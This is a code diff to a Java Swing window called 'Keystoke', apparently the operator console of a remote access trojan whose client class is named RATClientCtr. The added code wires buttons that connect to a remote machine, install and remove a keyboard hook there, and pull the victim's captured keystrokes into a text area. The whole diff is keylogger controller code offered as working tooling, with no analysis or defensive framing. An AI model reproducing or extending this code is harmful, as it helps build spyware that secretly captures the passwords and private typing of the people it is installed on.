@@ -24,6 +24,7 @@ public class Keystoke extends javax.swing.JFrame {
     }
     
     public static String IP;
+    public static ArrayList<Character> key = new ArrayList<Character>();
 
     /**
      * This method is called from within the constructor to initialize the form.
@@ -60,6 +61,11 @@ public class Keystoke extends javax.swing.JFrame {
         });
 
         PrintkeyBtn.setText("Print key");
+        PrintkeyBtn.addActionListener(new java.awt.event.ActionListener() {
+            public void actionPerformed(java.awt.event.ActionEvent evt) {
+                PrintkeyBtnActionPerformed(evt);
+            }
+        });
 
         DeleteBtn.setText("Delete");
         DeleteBtn.addActionListener(new java.awt.event.ActionListener() {
@@ -132,13 +138,8 @@ public class Keystoke extends javax.swing.JFrame {
             try {
                 RATClientCtr.ConnectionCtr(host);
                 String res = RATClientCtr.getConnectRes();
-                if(res.equals("ok")) {
-                    ArrayList<Character> key = new ArrayList<Character>();
-                    RATClientCtr.getKey(key);
-                    for(int i = 0; i < key.size(); i++) {
-                        jTextArea1.append(key.get(i).toString());
-                    }
-                    
+                if(res.equals("ok")) { 
+                    RATClientCtr.keyHook();
                     //System.out.println(RATClientCtr.getCommandRes());
                     JOptionPane.showMessageDialog(rootPane, "Success!");
                 }else {
@@ -153,6 +154,23 @@ public class Keystoke extends javax.swing.JFrame {
 
     private void UnhookBtnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_UnhookBtnActionPerformed
         // TODO add your handling code here:
+        if(host.isEmpty()) {
+            JOptionPane.showMessageDialog(rootPane, "Not connected!");
+        }else {
+            try {
+                RATClientCtr.ConnectionCtr(host);
+                String res = RATClientCtr.getConnectRes();
+                if(res.equals("ok")) { 
+                    RATClientCtr.unHook();
+                    JOptionPane.showMessageDialog(rootPane, "Success!");
+                }else {
+                    JOptionPane.showMessageDialog(rootPane, "Fail!");
+                }
+              RATClientCtr.closeConn();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
     }//GEN-LAST:event_UnhookBtnActionPerformed
 
     private void BackBtnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_BackBtnActionPerformed
@@ -161,6 +179,30 @@ public class Keystoke extends javax.swing.JFrame {
         sc.setVisible(true);
         Keystoke.this.setVisible(false);
     }//GEN-LAST:event_BackBtnActionPerformed
+
+    private void PrintkeyBtnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_PrintkeyBtnActionPerformed
+        // TODO add your handling code here:
+        if(host.isEmpty()) {
+            JOptionPane.showMessageDialog(rootPane, "Not connected!");
+        }else {
+            try {
+                RATClientCtr.ConnectionCtr(host);
+                String res = RATClientCtr.getConnectRes();
+                if(res.equals("ok")) { 
+                    RATClientCtr.getKey(key);
+                    for(int i = 0; i < key.size(); i++) {
+                        jTextArea1.append(key.get(i).toString());
+                    }
+                    JOptionPane.showMessageDialog(rootPane, "Success!");
+                }else {
+                    JOptionPane.showMessageDialog(rootPane, "Fail!");
+                }
+              RATClientCtr.closeConn();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+    }//GEN-LAST:event_PrintkeyBtnActionPerformed
 
     /**
      * @param args the command line arguments
